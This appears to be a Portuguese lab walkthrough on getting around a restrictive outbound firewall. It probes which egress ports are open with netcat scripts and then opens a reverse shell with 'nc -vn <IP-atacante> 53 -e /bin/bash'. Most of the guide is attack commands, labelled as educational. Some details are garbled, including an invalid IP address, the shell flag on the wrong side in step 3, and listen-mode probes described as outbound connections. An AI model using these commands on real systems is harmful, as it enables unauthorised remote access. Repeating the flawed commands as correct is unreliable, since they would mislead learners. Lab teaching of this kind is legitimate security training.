# VENCENDO-FIREWALL-CEN-RIO-04-REVERSE-SHELL-
Este guia explica como contornar um firewall restritivo (rules4) que bloqueia todo o tráfego de entrada, mas permite algumas conexões de saída. Tentar um bindshell direto ou um reverse shell padrão falha, então precisamos identificar portas de saída permitidas e depois estabelecer um reverse shell por elas.

⚠️ Uso exclusivo para fins educacionais • Desenvolvido por M!ss s3c

Passo 1: Acessar o servidor
ssh root@1172.16.1.5


Digite a senha

Navegue até o diretório das regras de firewall:

cd /home/msfadmin/firewall

Passo 2: Limpar e aplicar regras restritivas
./limpa_rules.sh    # limpa as regras atuais do firewall
./rules4.sh         # aplica regras restritivas

Passo 3: Testar reverse shell padrão (vai falhar)

Na máquina atacante:

nc -vnlp 5050 -e /bin/bash


Na máquina alvo (via VPN ou rede direta):

nc -vn 172.20.1.73 5050


Resultado esperado: falha na conexão devido às restrições do firewall.

Passo 4: Identificar portas de saída permitidas

Precisamos descobrir quais portas de saída do servidor conseguem se conectar à máquina atacante.

4.1 Criar script de teste no servidor
nano test_fw.sh


Adicione o seguinte:

#!/bin/bash
echo "Abrindo portas..."
nc -vnlp 172.20.1.73 80 &
sleep 2
nc -vnlp 172.20.1.73 443 &
sleep 2
nc -vnlp 172.20.1.73 53 &
echo "Portas abertas"
netstat -nlpt


Esse script tenta abrir conexões do servidor para a máquina atacante em várias portas.

netstat -nlpt mostra quais conexões foram estabelecidas com sucesso.

4.2 Criar script correspondente na máquina atacante
nano open_fw.sh

#!/bin/bash
echo "Abrindo portas..."
nc -vnlp 80 &
sleep 2
nc -vnlp 443 &
sleep 2
nc -vnlp 53 &
echo "Portas abertas"
netstat -nlpt

4.3 Executar os scripts

Na máquina atacante:

./open_fw.sh


No servidor:

./test_fw.sh | grep "open"


Verifique a saída para identificar quais portas se conectaram com sucesso.

No exemplo, as portas 80, 443 e 53 estão permitidas.

Esse processo descobre quais portas de saída o firewall permite. Pode-se testar TCP ou UDP.

Passo 5: Estabelecer reverse shell

Na máquina atacante, escute em uma porta permitida:

nc -vnlp 53


No servidor alvo, conecte de volta para o IP da máquina atacante usando a porta permitida:

nc -vn <IP-atacante> 53 -e /bin/bash


Substitua <IP-atacante> pelo IP da máquina atacante.

Quando a conexão mostrar OPEN, o reverse shell foi estabelecido com sucesso.

Passo 6: Verificar conexão

Na máquina atacante:

ifconfig eth0


Confirma que você tem acesso à shell através da porta de saída permitida.

👉 O que você aprendeu aqui

Firewalls restritivos podem bloquear conexões diretas, mas conexões de saída podem ser usadas para reverse shell.

Scripts de teste de portas ajudam a identificar quais portas são permitidas pelo firewall.

Usar reverse shell pelas portas permitidas contorna regras restritivas.

Sempre valide portas permitidas antes de tentar reverse shell.

⚠️ Use este método apenas em ambientes autorizados e controlados para aprendizado ou testes. Uso não autorizado é ilegal.
